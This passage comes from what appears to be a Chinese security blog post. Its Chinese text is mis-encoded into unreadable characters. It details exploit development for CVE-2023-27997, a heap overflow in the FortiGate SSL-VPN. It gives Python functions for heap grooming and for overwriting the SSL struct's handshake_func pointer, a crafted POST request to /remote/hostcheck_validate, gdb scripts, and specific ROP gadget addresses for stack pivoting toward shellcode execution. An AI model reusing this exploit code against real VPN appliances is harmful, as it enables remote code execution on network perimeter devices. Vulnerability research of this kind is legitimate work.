href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" alt="image.png"></a></p><p>æ¥ç€å°±æ˜¯åˆ©ç”¨åŸè¯­çš„é—®é¢˜, è¿™é‡Œç›´æ¥é‡‡ç”¨äº†ä½œè€…æä¾›çš„æ–¹æ³• ^[2]</p><p>å¤§è‡´çš„æ ¸å¿ƒåŸç†å°±æ˜¯ä½¿ç”¨ä¸¤æ¬¡å¼‚æˆ–, è¿™æ ·å°±ä¸ä¼šè®©å‰é¢çš„æ•°å€¼å‘ç”Ÿæ··ä¹±.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" alt="image.png"></a></p><p>å‡è®¾æˆ‘ä»¬è¦ä¿®æ”¹ 5000åç§»çš„å€¼ä¸º 0xff , . é‚£ä¹ˆæˆ‘ä»¬è¦æº¢å‡ºä¸¤æ¬¡, ç¬¬ä¸€æ¬¡å°†é•¿åº¦è®¾ç½®ä¸º 4999 , æ­¤æ—¶æº¢å‡ºç»“æŸåä¼šå°† 5000 ä½ç½®çš„å€¼å†™æˆ 0 , ç´§æ¥ç€ç¬¬äºŒæ¬¡ç”¨æˆ‘ä»¬è®¡ç®—å¥½çš„ seed  é€šè¿‡ <code>0xff ^ 0 </code>çš„æ–¹å¼ , å°†5000ä½ç½®è®¾ç½®æˆ 0xff </p><p>æŒ‰ç…§ä½œè€…è¯´æ˜å°±æ˜¯ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="image.png"></a></p><h3 id="å †å¸ƒå±€"><a href="#å †å¸ƒå±€" class="headerlink" title="å †å¸ƒå±€"></a>å †å¸ƒå±€</h3><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å»æº¢å‡ºè¦†ç›– SSL ç»“æ„ä¸­çš„ <code>handshake_func</code> æŒ‡é’ˆï¼Œ è¿™åˆ©ç”¨æ˜¯å‚è€ƒçš„ orange å½“æ—¶çš„ä¸€ä¸ªåšå®¢ ^[3]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_do_handshake</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == <span class="literal">NULL</span>) &#123;</span><br><span class="line">             <span class="class"><span class="keyword">struct</span> <span class="title">ssl_async_args</span> <span class="title">args</span>;</span></span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             ret = s-&gt;handshake_func(s);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>SSL ç»“æ„ä½“å¦‚ä¸‹ ^[4]:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span></span><br><span class="line"><span class="comment">     * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">     * is returned.  This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">     * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> rwstate;</span><br><span class="line">    <span class="keyword">int</span> (*handshake_func) (SSL *);</span><br></pre></td></tr></table></figure><p>é‚£è¿™çš„é—®é¢˜å°±æ˜¯è½¬åŒ–ä¸ºï¼Œ æˆ‘ä»¬å¦‚ä½•ç¨³å®šçš„å°† <code>out</code> è¿™ä¸ªç¼“å†²åŒºæ”¾ç½®åœ¨  SSL ç»“æ„ä½“çš„ç¼“å†²åŒºå‰é¢ï¼Œ è¿™æ ·æº¢å‡ºçš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¦†ç›–åˆ°ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒäº†éƒ¨åˆ†ä½œè€…çš„æ€è·¯ï¼Œ åœ¨æˆ‘ä»¬è¿™ä¸ªæµ‹è¯•ç‰ˆæœ¬ä¸­ï¼Œ  SSL ç»“æ„çš„å¤§å°ä¸º 0x1db8 å­—èŠ‚ï¼Œ ä»–å°†åˆ†é…åœ¨ 0x2000  çš„ç¼“å†²åŒºå†… ã€‚ å¦å¤–æä¸€å¥è¿™é‡Œçš„å †åˆ†é…å™¨ç”¨çš„æ˜¯ jemalloc  ï¼Œ ç¬¦åˆä¸€äº›åè¿›å…ˆå‡ºçš„è§„åˆ™ï¼Œå› æ­¤æˆ‘ä»¬çš„æœ€ç»ˆæ€è·¯å¤§æ¦‚å°±æ˜¯ï¼š</p><p>æˆ‘ä»¬ç”¨äº† gdb è®¾ç½®å½“å‰ PC ä¸º <code>je_malloc_stats_print</code> å‡½æ•°åœ°å€ï¼Œæ‰“å°å½“å‰ <code>jemalloc</code> çš„åˆ†é…æƒ…å†µ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" alt="image.png"></a></p><p>å¯ä»¥å‘ç°é»˜è®¤æƒ…å†µä¸‹ <code>0x2000</code> è¿™ä¹ˆçš„å¤§çš„å†…å­˜æ˜¯ä¸ä¼šæ€ä¹ˆä½¿ç”¨åˆ°çš„ï¼Œ å› æ­¤æˆ‘ä»¬åªéœ€è¦å…ˆåˆ†é…å‡ æ¬¡ ï¼ˆè¿™é‡Œä½¿ç”¨ 10 æ¬¡ ï¼‰åˆ†é…0x2000 çš„ bufferï¼Œç„¶åé‡Šæ”¾æ‰è®©è¿™è¿ç»­çš„å†…å­˜è¿›å…¥åˆ°é“¾è¡¨é‡Œï¼Œæ–¹ä¾¿åé¢åˆ©ç”¨çš„æ—¶å€™è®© out çš„ç¼“å†²åŒºåœ¨ ssl ç»“æ„ä½“å‰é¢ã€‚è¿™é‡Œçš„åˆ†é…åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªè¯·æ±‚ç»™ä¸€ä¸ªè§£æPOSTå‚æ•°çš„ç½‘é¡µ ï¼Œ åœ¨è¿™ä¸ªè¯·æ±‚ä¸­ï¼Œå‘é€äº†POST key-valueå¯¹ï¼Œ å…¶ä¸­sizeof(key) = sizeof(struct_ssl) - 0x18 - 0x10 è€Œsizeof(value)=0 ï¼Œ ä¾‹å¦‚æˆ‘ä»¬å‘é€ä¸€ä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;remote&#x2F;hostcheck_validate HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">A*(sizeof(struct_ssl) - 0x18 - 0x10)&#x3D;&amp;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ç†æƒ³æƒ…å†µä¸‹ä¼šåˆ†åˆ†é…ä¸€ä¸ªå¦‚ä¸‹çš„å†…å­˜ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" alt="image.png"></a></p><p>æœ‰ä¸‰ä¸ª <code>AAAA</code> çš„å†…å­˜åŸå› æ˜¯åœ¨è§£æPOSTæ•°æ®çš„æ—¶å€™ï¼Œç¨‹åºä¼šè¿™ä¹ˆåšï¼šæ‹¿åˆ°æ•´ä¸ªPOSTDATAç¼“å†²åŒºï¼ˆä¾‹å¦‚a=b&amp;c=d&amp;e=fï¼‰ï¼Œç„¶åæå–å‡ºâ€™&amp;â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆé‚£æ˜¯1ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œæ‹¿åˆ°â€™=â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆä¸¤ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œå®ƒå°†é”®å’Œå€¼å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å“ˆå¸Œæ˜ å°„ä¸­ï¼Œè¿™ä¼šå¯¼è‡´äº§ç”Ÿç¬¬ä¸‰ä¸ªåˆ†é…</p><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿåˆ†é…çš„æƒ…å†µï¼Œ æˆ‘ä»¬è¿˜å¯ä»¥ç”¨åˆ° gdb çš„commands å’Œ logging åŠŸèƒ½ã€‚å¤§è‡´å°±æ˜¯åœ¨ <code>je_malloc</code> åˆ†é…ç»“æŸåä¸‹æ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.text:0000000001776C85 E8 D6 5A CC+                call    _je_malloc</span><br><span class="line">&#x2F;&#x2F;.text:0000000001776C8A 49 89 C4                    mov     r12, rax</span><br><span class="line">break *0x1776C8A </span><br><span class="line">commands 1</span><br><span class="line">set logging file ssl_chunk.txt</span><br><span class="line">set logging enable on</span><br><span class="line">p&#x2F;x $rax</span><br><span class="line">set logging enable off</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°½é‡è®©å…¶åˆ†é…çš„æ—¶å€™æ˜¯è¿ç»­çš„å†…å­˜ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" alt="image.png"></a></p><p>å½“ç„¶åœ¨å®é™…ç¯å¢ƒä¸­å¯èƒ½æœ‰å…¶ä»–çš„å¹²æ‰°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¤šåˆ†é…å‡ æ¬¡ ï¼Œä¾‹å¦‚æˆ‘ä¸Šä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ˜¯åˆ†é…äº† <code>301</code> æ¬¡ï¼Œ ç„¶ååœ¨è¿™å‡ ä¸ª sock éƒ½closeæ‰è®©å…¶é‡Šæ”¾ã€‚æˆ‘è¿™éƒ¨åˆ†ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_layout</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    <span class="comment"># heap layout</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:<span class="number">10</span>]:</span><br><span class="line">        payload += i*(size) + <span class="string">&#x27;=&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸¤ä¸ª sock  ï¼Œ ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rewrtie_ssl_struct</span>(<span class="params">IP, port, salt, seeds</span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;Creating sockets...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    vul_sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock4 = make_ssl_socket(IP, port)</span><br><span class="line">    sock4.sendall(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;Rewrite SSL struct&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seeds:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> seed:</span><br><span class="line">            write_value(vul_sock, salt, seed[offset].decode(<span class="string">&#x27;latin1&#x27;</span>), offset)</span><br><span class="line">    <span class="keyword">return</span> (vul_sock, sock4)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€ä¸ª <code>vul_sock</code> æ˜¯ç”¨æ¥æº¢å‡º buffer ï¼Œ ç„¶å sock4 æ˜¯ç”¨æ¥åˆ†é… ssl ç»“æ„ä½“ï¼Œ ç”¨æ¥è¢«æº¢å‡ºçš„ã€‚ è¿™æ ·ä¹‹åæˆ‘ä»¬å°±èƒ½ç¨³å®šè§¦å‘æº¢å‡ºï¼Œä¸”ç¨³å®šçš„è®© ssl ç»“æ„ä½“åˆ†é…åœ¨ out çš„ç¼“å†²åŒºåé¢<br>ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" alt="image.png"></a></p><h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å½“è§¦å‘æº¢å‡ºçš„æ—¶å€™ï¼Œ æˆ‘ä»¬çš„è¿™ä¸ªæ—¶å€™æŒ‡é’ˆå’Œå†…å­˜å¤§æ¦‚å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" alt="image.png"></a></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“æˆ‘ä»¬æ§åˆ¶ PC  åï¼Œ è¿™é‡Œçš„ <code>RDI</code> å¯„å­˜å™¨æŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„ ssl ç»“æ„ä½“ï¼Œ å› æ­¤ç¬¬ä¸€ä¸ªæ¶Œä¸Šçš„æ€è·¯æ˜¯åšæ ˆè¿ç§»ï¼Œ æ‰¾ä¸€ä¸ªç±»ä¼¼äº</p><p><code>push rdi; pop rsp; ... ; ret </code> çš„ gadget å³å¯ï¼Œ æˆ‘ä»¬æœ€åä½¿ç”¨çš„æ˜¯ <code>push_rdi_pop_rsp = 0x669129 # push rdi ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</code></p><p>è¿™æ ·å°±å°†æ ˆæˆåŠŸè¿ç§»åˆ°äº†æˆ‘ä»¬çš„ ssl stuct ï¼Œ å³å¯æ§çš„å¯å†™çš„ç¼“å†²åŒºå†…ã€‚ ç„¶åè¿™é‡Œé¢„æœŸç›´æ¥åœ¨ ssl ç¼“å†²åŒºæ¥ç€å†™æˆ‘ä»¬å‰©ä¸‹çš„ <code>gadget</code> ï¼Œ ä½†æ˜¯è¿™é‡Œçªç„¶å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ ssl struct ä¼¼ä¹æœ‰å¾ˆå¤šç»“æ„ä½“ä¸èƒ½è¢«å†™ï¼Œ ä¸€å†™å°±æŠ¥é”™ ã€‚</p><p>äºæ˜¯æˆ‘åœ¨è¿™é‡Œæ¢äº†ä¸ªæ€è·¯ï¼Œ æ¥ç€å°è¯•å¸ƒå±€å †ç»“æ„ï¼Œç†æƒ³æƒ…å†µåº”è¯¥æ˜¯ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" alt="image.png"></a></p><p>æˆ–è€…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" alt="image.png"></a></p><p>åœ¨ out å‰é¢ ï¼Œ æˆ–è€… ssl struct çš„åé¢å¸ƒå±€ä¸€å—å®Œå…¨å¯æ§çš„å†…å­˜ï¼Œ ä½†æ˜¯ç”±äºæˆ‘ä»¬çš„è¿™å—å®Œå…¨å¯æ§çš„å†…å­˜æ˜¯ä¸èƒ½è¢« 00 æˆªæ–­çš„ï¼Œ å› æ­¤key-value å¯¹çš„  key ä¼¼ä¹æ˜¯ä¸èƒ½ç”¨æ¥å¸ƒå±€çš„ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘æƒ³äº†ä¸‹ï¼Œ key ä¸èƒ½è¢«ç”¨æ¥å¸ƒå±€å †ï¼Œ ä½†æ˜¯ value åº”è¯¥æ˜¯å¯ä»¥çš„ï¼ï¼ å› æ­¤æˆ‘åœ¨æº¢å‡ºç»“æŸä¹‹åï¼Œ æ¥ç€å°è¯•ç”¨å¦‚ä¸‹ä»£ç å‘åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layout_gadget</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    ropchain = build_ropchain(args)</span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        junk = cyclic(size, n=<span class="number">8</span>)</span><br><span class="line">        pay = bytearray(junk)</span><br><span class="line">        <span class="comment">#pay[1: 1+13 * 8] = p64(ret) * 13</span></span><br><span class="line">        <span class="comment">#pay[105:105+len(ropchain)]  = ropchain</span></span><br><span class="line">        junk = bytes(pay)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;cccc&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;dddd&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;eeee&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk </span><br><span class="line">        payload += <span class="string">&#x27;&amp;username=vvvv&#x27;</span></span><br><span class="line">        sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sock</span><br></pre></td></tr></table></figure><p>æˆåŠŸåœ¨ out ç¼“å†²åŒºå†™ä¸‹äº†ä¸€å—å¯æ§çš„å†…å­˜</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" alt="image.png"></a></p><p>å› æ­¤æ­¤æ—¶å†…å­˜ç»“æ„å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" alt="image.png"></a></p><p>ç”±äº ssl struct æœ‰å¾ˆå¤šä¸èƒ½å†™çš„åœ°æ–¹ï¼Œ äºæ˜¯æˆ‘æƒ³åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ å°è¯•å»æ‰¾å¤§é‡è¿ç»­æ˜¯ 0 çš„ç¼“å†²åŒºï¼Œ ç„¶åä»…ä»…å†™å…¥å¦å¤–ä¸€æ®µ stack pivot chainï¼Œå°†æ ˆè¿ç§»åˆ°å‰é¢çš„å¯æ§ç¼“å†²åŒºä¸­ ã€‚æœ€åæˆ‘ä½¿ç”¨äº†è¿™æ ·çš„ chain ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000060bdb4   # pop rax ; pop rdx ; ret</span><br><span class="line">bss_addr &#x3D; 0x4698eb0 # -&gt; rax</span><br><span class="line">offfset &#x3D;  0x26e0-1  # rdx -&gt; ropchain</span><br><span class="line">0x61a292  # : sub rsp, rdx ; dec dword ptr [rax - 0x77] ; ret</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ¡ chainï¼Œ å°†æ ˆè¿ç§»åˆ°å‰é¢çš„ç¼“å†²åŒºï¼Œ è¿›è¡Œæ›´å¤æ‚çš„æ“ä½œã€‚</p><h3 id="æ‰§è¡Œä»»æ„æŒ‡ä»¤"><a href="#æ‰§è¡Œä»»æ„æŒ‡ä»¤" class="headerlink" title="æ‰§è¡Œä»»æ„æŒ‡ä»¤"></a>æ‰§è¡Œä»»æ„æŒ‡ä»¤</h3><p>åœ¨å®Œæˆæ­¤éƒ¨åˆ†ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»„è£…ROPé“¾çš„è¿‡ç¨‹äº†ã€‚å°½ç®¡è¯¥ç¨‹åºéå¸¸åºå¤§ï¼Œä»¥è‡³äºå‡ ä¹å¯ä»¥æ‰¾åˆ°æ‰€éœ€çš„ä»»ä½•gadgeté“¾ï¼Œä½†æ‰¾å¯»gadgetç»ˆç©¶æ˜¯ä¸€ä¸ªç›¸å¯¹ç¹ççš„ä»»åŠ¡ã€‚å› æ­¤ï¼Œæœ€åå†³å®šé‡‡ç”¨mprotect + shellcodeçš„æ–¹æ³•ã€‚é¦–å…ˆï¼Œåˆ©ç”¨ä¸€äº›gadgetå°†rdiæŒ‡å‘ROPé“¾çš„å†…å­˜å¼€å¤´ã€‚</p><p>è¿™ä¸€éƒ¨åˆ†å†…å®¹å°±ç•™ä½œç»™è¯»è€…å®Œæˆå§</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>^[1]   <a href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a><br>^[2]  <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a><br>^[3] <a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=The%20crash%20happened%20in">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a><br>^[4] <a href="https://github.dev/openssl/openssl/tree/openssl-3.0.0%E2%89%A5">https://github.dev/openssl/openssl/tree/openssl-3.0.0â‰¥</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2023-27997 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow</title>
      <link href="CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html"/>
